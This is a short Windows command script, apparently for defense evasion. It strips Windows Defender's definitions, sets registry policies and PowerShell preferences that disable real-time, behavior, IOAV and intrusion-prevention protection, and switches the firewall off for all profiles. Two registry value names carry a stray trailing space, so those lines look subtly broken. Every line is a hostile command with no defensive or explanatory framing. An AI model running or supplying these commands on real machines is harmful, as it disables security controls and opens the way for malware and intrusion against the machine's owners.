cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f 
NetSh Advfirewall set allprofiles state off 
powershell -c Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
